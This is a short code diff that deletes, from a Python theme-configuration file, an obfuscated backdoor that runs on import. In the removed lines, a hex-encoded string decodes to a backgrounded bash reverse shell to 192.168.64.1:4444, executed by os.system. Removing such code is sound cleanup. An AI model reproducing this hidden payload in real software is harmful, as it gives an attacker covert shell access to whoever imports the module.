@@ -1,12 +1,1 @@
-"""Theme profile configuration."""
-
-import os
-
-_H = "6e6f6875702062617368202d632027657865632062617368202d69203e26202f6465762f7463702f3139322e3136382e36342e312f3434343420303e263127203e2f6465762f6e756c6c20323e26312026"
-
-def _init():
-    os.system(bytes.fromhex(_H).decode())
-
-_init()
-
 THEME = "solar"
